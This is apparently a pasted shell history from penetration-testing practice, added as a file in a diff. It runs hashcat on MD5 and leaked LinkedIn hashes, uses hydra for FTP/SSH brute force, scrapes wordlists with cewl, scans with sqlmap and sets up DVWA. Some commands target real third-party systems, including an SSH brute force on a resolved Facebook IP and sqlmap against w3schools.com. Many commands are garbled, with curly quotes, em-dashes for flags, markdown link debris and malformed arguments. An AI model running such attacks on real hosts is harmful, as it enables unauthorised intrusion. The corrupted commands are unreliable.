@@ -1,0 +1,179 @@
+echo -n “Admin” | md5sum | tr -d “-”>>dictionary_hashes.txt
+
+cat dictionary_hashes.txt
+
+locate rockyou
+
+hashcat -O -m 0 -a 0 Done.txt dictionary.txt /
+
+cat Done.txt
+
+echo -n password | md5sum
+
+echo -n password | md5sum | tr -d “-”>>hashes
+
+cat hashes
+
+cat known-pass
+
+hashcat -O -m 0 -a 0 output.txt hashes known-pass
+
+wget https://raw.githubusercontent.com/deargle/security-assignments/master/labs/files/LinkedIn_HalfMillionHashes.txt
+
+hashcat  -m 100 —remove —outfile=LinkedIn_cracked.txt  LinkedIn_HalfMillionHashes.txt /
+
+wc -l LinkedIn_HalfMillionHashes.txt
+
+hydra -h
+
+cat user.txt
+
+hydra -l admin -p pass.lst 10.0.2.15 ftp -v
+
+cat user.txt
+
+cat pahuss.lst
+
+sudo su
+
+hydra -V -l istheory -p / https-get://is.theorizeit.org/auth/
+
+dig facebook.com
+
+hydra -l root -P “/” 157.240.192.35 -t 6 ssh
+
+hydra -l root -P “/”  ftp://192.168.0.1
+
+locate passlist.txt
+
+hydra -l root -P “/” ftp://192.168.0.1
+
+cewl -d 3 -m 6 -w words.txt https://www.maltronics.com
+
+cewl https://site.ru -d 1 -w dic.txt
+
+cat dic.txt
+
+cewl https://www.maltronics.com -d 2 -w words.txt -a —meta_file meta.txt -e —email_file emails.txt -c
+
+cat words.txt
+
+cewl https://www.maltronics.com -d -w words.txt -a —meta_file meta.txt -e —email_file emails.txt -c
+
+cewl https://www.maltronics.com  -w words.txt -a —meta_file meta.txt -e —email_file emails.txt -c
+
+cat words.txt
+
+ls
+
+cat emails.txt
+
+cewl https://hackware.ru -d 1  -w words.txt -a —meta_file meta.txt -e —email_file emails.txt -c
+
+tail words.txt
+
+cewl http://vulnweb.com -m 10 -w dict.txt
+
+cewl https://digi.ninja/contact.php -e -n
+
+cewl http://www.vulnweb.com -c
+
+cewl http://www.vulnweb.com -d 3
+
+cewl http://www.vulnweb.com -v
+
+cewl http://testphp.vulnweb.com/artists.php
+
+cewl http://testphp.vulnweb.com/login.php —auth_type Digest —auth_user “test” —authpass “test” -v
+
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 —random-agent
+
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -dbs —random-agent
+
+crunch 1 6 admin
+
+ls
+
+cat user.txt
+
+hydra -l admin -p pass.lst 10.0.2.15 ftp -v
+
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart —tables
+
+cd/var/www/html
+
+sudo git clone https://github.com/ethicalhack3r/DVWA
+
+ls
+
+sudo mv DVWA dvwa
+
+chmod -R 777 dvwa
+
+cd dvwa/config
+
+ls
+
+sudo cp [config.in](http://config.inc).php.dist config.inc.php
+
+nano config.inc.php
+
+service mysql start
+
+sudo mysql -u root 
+
+locate /etc/php/8.1/apache2
+
+cd /etc/php/8.1/apache2
+
+mousepad php.ini
+
+service apache2 start
+
+mousepad php.ini
+
+sudo gedit php.ini
+
+sudo systemctl start mysql
+
+sudo rm -rf /etc/php/7.1/
+
+sudo apt autoremove
+
+cewl http://10.0.2.15:1080
+
+cewl -d 2 http://192.168.36.16/forum
+
+vi password.txt
+
+nano password.txt
+
+cat password.txt
+
+ls
+
+git clone —depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+
+cd sqlmap-dev
+
+python sqlmap.py
+
+python [sqlmap.py](http://sqlmap.py) -u
+
+python [sqlmap.py](http://sqlmap.py) -u ‘https://www.w3schools.com/php/phptryit.asp?filename=tryphp_var’ —random-agent
+
+python [sqlmap.py](http://sqlmap.py) -u ‘http://mytestsite.com/page.php?id=5’ —random-agent
+
+python [sqlmap.py](http://sqlmap.py) -u ‘http://mytestsite.com/page.php?id=5’ —tables
+
+ls
+
+sudo ZAP 2 11 1 unix.sh
+
+sudo ./ZAP 2 11 1 unix.sh
+
+ls
+
+sudo chmod 755 xampp-linux-x64-8.0.18.0-installer.run
+
+sudo ./xampp-linux-x64-8.0.18.0-installer.run
